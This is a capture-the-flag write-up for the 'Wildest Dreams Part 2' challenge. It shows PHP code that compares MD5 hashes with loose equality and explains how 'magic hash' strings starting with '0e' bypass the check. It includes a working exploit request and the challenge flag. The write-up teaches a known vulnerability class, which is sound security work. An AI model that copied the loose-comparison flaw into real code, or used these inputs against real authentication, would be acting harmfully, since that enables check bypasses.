# Wildest Dreams Part 2

> The opener is back for another round of fun. Enjoy\
> \
> http://chals.ctf.sg:40401\
> \
> author: Gladiator

Taking a look at the source, we see that we have to attack the following PHP code:

```php
<?php
	if(!empty($_GET['i1']) && !empty($_GET['i2'])){
		$i1 = $_GET['i1'];
		$i2 = $_GET['i2'];
		var_dump(md5($i1) == md5($i2));
		if($i1 === $i2){
			die("i1 and i2 can't be the same!");
		}
		$len1 = strlen($i1);
		$len2 = strlen($i2);
		if($len1 < 15){
			die("i1 is too shorttttttt pee pee pee pee pee");
		}
		if($len2 < 15){
			die("i2 is too shorttttttt pee pee pee pee pee");
		}
		if(md5($i1) == md5($i2)){
			echo $flag;
		}
		echo "<br>The more that you say, the less i know.";
	} else {
		echo "<br> You need to provide two strings, i1 and i2. /1989.php?i1=a&i2=b";
	}
?>
```

We are essentially looking for two strings whose MD5 hashes are "equal" to each other. In PHP, `==` (as opposed to `===`) means that we are using loose comparison. In particular, when a string starts with `0e...`, PHP will treat it as a float with value 0.0 (following scientific notation).

```bash
$ php -r "var_dump('0e1' == 0.0);"
bool(true)
$ php -r "var_dump('0e1' == '0e2');"
bool(true)
```

The result of this is that there are "magic hashes" that are considered equal to each other, and nice [lists](https://github.com/spaze/hashes/blob/master/md5.md) of strings that result in these magic hashes.

Using two of these strings with length 15 or more, we can solve this challenge.

`GET /1989.php?i1=hello14916008992&i2=hello14943865304 HTTP/1.1`

The flag is `CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}`
